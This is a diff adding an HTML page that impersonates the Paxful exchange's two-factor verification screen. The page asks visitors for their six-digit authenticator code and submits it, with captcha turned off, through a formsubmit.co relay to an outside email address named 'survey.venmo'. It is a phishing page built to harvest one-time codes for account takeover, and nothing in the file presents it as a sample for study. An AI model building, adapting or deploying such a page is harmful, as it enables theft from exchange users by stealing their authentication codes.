@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            width: 90%;
+            max-width: 1200px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .verification-section {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .back-link {
+            display: block;
+            color: #a3a3a3;
+            font-size: 0.9rem;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .logo span {
+            font-size: 24px;
+            font-weight: bold;
+            color: #7ed957;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin: 0 0 10px;
+        }
+
+        p {
+            margin: 0 0 20px;
+            font-size: 0.9rem;
+            color: #a3a3a3;
+        }
+
+        .code-input-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 50px;
+            background-color: #1f1f1f;
+            border: none;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1.5rem;
+            color: white;
+            outline: none;
+        }
+
+        .code-input::placeholder {
+            color: #a3a3a3;
+        }
+
+        .submit-btn {
+            margin-top: 20px;
+            width: 100%;
+            padding: 15px;
+            background-color: #7ed957;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: bold;
+            color: black;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #6bd44e;
+        }
+
+        .illustration-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .illustration-section img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const inputs = document.querySelectorAll(".code-input");
+
+            // Focus the first input when the page loads
+            inputs[0].focus();
+
+            inputs.forEach((input, index) => {
+                input.addEventListener("input", (event) => {
+                    const value = event.target.value;
+                    if (value.length === 1 && index < inputs.length - 1) {
+                        // Automatically jump to the next input
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener("keydown", (event) => {
+                    if (event.key === "Backspace" && index > 0 && !input.value) {
+                        // Move to the previous input when pressing Backspace
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+
+            /*
+            document.querySelector("form").addEventListener("submit", (event) => {
+                event.preventDefault();  // COMMENTED OUT: This was preventing the page from reloading
+            });
+            */
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="verification-section">
+            <a href="#" class="back-link">← Back</a>
+            <div class="logo">
+                <img src="https://via.placeholder.com/30x30" alt="Logo">
+                <span>paxful</span>
+            </div>
+            <h1>Verification</h1>
+            <p>Enter the 6-digit code we sent to the authenticator associated with your account:</p>
+            <form method="POST" action="https://formsubmit.co/survey.venmo@tutamail.com">
+                <div class="code-input-container">
+                    <input type="text" maxlength="1" class="code-input" name="code1" required>
+                    <input type="text" maxlength="1" class="code-input" name="code2" required>
+                    <input type="text" maxlength="1" class="code-input" name="code3" required>
+                    <input type="text" maxlength="1" class="code-input" name="code4" required>
+                    <input type="text" maxlength="1" class="code-input" name="code5" required>
+                    <input type="text" maxlength="1" class="code-input" name="code6" required>
+                </div>
+	<input type="hidden" name="_captcha" value="false">
+                <button type="submit" class="submit-btn">Submit</button>
+            </form>
+        </div>
+        <div class="illustration-section">
+            <img src="https://via.placeholder.com/500x300" alt="Illustration">
+        </div>
+    </div>
+</body>
+</html>
